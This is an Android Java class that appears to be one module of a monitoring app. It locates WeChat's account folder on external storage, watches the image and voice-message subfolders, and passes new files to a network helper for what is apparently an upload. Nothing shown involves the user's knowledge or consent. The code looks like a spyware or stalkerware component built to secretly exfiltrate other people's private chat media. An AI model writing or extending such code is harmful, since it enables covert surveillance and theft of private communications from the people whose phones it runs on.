package test.com.accessibility.core.wechat;

import android.content.Context;
import android.os.Environment;
import android.util.Log;

import java.io.File;

import test.com.accessibility.util.network.AsyncHelper;
import test.com.accessibility.util.fileListMonitor.fileListMonitor;

public class wechatFileUpload {
    private static String tag = "tluo";
    private static String module = "fileUpload";
    private static String targetDir = null;
    private static boolean Wechat_Voice_Monitor_First_Time_Launch = true;
    private static boolean Wechat_Image_Monitor_First_Time_Launch = true;
    private static AsyncHelper imageCallback;
    private static AsyncHelper voiceCallback;

    public static boolean init(Context context){
        imageCallback = new AsyncHelper(context, false);
        voiceCallback = new AsyncHelper(context, false);

        String root_sd = Environment.getExternalStorageDirectory().toString();
        String path = root_sd + "/tencent/MicroMsg";
        Log.d(tag, "Tencent micromsg folder: " + path);
        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();
        for (int i = 0; i < listOfFiles.length; i++) {
            String fname = listOfFiles[i].getName();
            if ((fname.length() == 32) && (fname.matches("[a-zA-Z0-9]*")) && listOfFiles[i].isDirectory()) {
                targetDir = listOfFiles[i].getAbsolutePath();
                break;
            }
        }

        Log.d(tag, "[" + module + "] wechat sdcard folder:" + targetDir);
        return targetDir != null;
    }
    public static void imageUploading(Context context){
        if (targetDir == null) {
            boolean found = init(context);
            if (!found){
                return;
            }
        }

        String imageFolder = targetDir + "/image2";
        fileListMonitor imageObserver = new fileListMonitor(context, imageFolder, imageCallback);
        imageObserver.startWatching(Wechat_Image_Monitor_First_Time_Launch);
        if (Wechat_Image_Monitor_First_Time_Launch){
            Wechat_Image_Monitor_First_Time_Launch = false;
        }
    }

    public static void voiceUploading(Context context){
        if (targetDir == null) {
            boolean found = init(context);
            if (!found){
                return;
            }
        }
        String voiceFolder = targetDir + "/voice2";
        fileListMonitor voiceObserver = new fileListMonitor(context, voiceFolder, voiceCallback);
        voiceObserver.startWatching(Wechat_Voice_Monitor_First_Time_Launch);
        if (Wechat_Voice_Monitor_First_Time_Launch){
            Wechat_Voice_Monitor_First_Time_Launch = false;
        }
    }
}
